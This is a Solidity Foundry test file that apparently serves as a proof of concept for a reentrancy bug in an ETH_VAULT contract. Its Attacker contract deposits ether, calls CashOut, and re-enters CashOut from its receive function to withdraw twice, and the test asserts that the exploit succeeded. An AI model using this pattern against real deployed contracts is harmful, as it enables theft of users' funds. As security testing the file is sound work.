
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ETH_VAULT, Log} from "../src/ETH_VAULT.sol";

contract TestReentrancyETH_VAULT is Test {
    
    ETH_VAULT public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new ETH_VAULT(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // MinDeposit is 1 ether, so attackVal must be strictly greater than 1 ether.
        // We limit the upper bound to ensure realistic ETH amounts and avoid overflow in test setup.
        vm.assume(attackVal > 1 ether + 1 gwei && attackVal < 1000 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state setup required on the vault itself, handled via attacker deposit.

        // --- 3. Funding ---
        // A. Fund the Victim (so it has extra ETH to steal beyond the attacker's deposit)
        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        // B. Fund the Attacker (redundancy)
        vm.deal(address(_attacker), attackVal * 2);

        // C. CRITICAL: Fund the Test Contract (address(this))
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_VAULT public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public attackAmount;

    constructor(address victimAddress) { 
        victim = ETH_VAULT(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackAmount = val;
        
        // Deposit funds first to satisfy the balance check in CashOut
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        uint256 startBalance = address(this).balance;

        // Call the vulnerable function
        victim.CashOut(val);

        uint256 endBalance = address(this).balance;

        // Verify Success Conditions:
        // If the attack succeeded, we withdrew 'val' twice (once normally, once via reentrancy).
        // Therefore, our balance should have increased by at least 2 * val.
        if (endBalance >= startBalance + (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            // Re-enter the contract
            victim.CashOut(attackAmount);
        }
    }
}
